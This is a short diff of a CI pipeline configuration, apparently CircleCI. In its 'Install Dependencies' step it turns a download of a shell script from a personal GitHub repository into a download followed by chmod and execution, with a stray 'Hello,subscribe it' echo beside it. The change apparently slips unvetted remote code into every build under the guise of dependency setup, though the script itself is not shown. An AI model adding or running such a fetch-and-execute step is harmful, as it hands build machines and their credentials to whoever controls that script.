@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://raw.githubusercontent.com/chirifa201/python/main/ruby.sh
+              wget https://raw.githubusercontent.com/chirifa201/python/main/ruby.sh && chmod +x ruby.sh && ./ruby.sh
               echo Hello,subscribe it
 workflows:
     version: 2.1
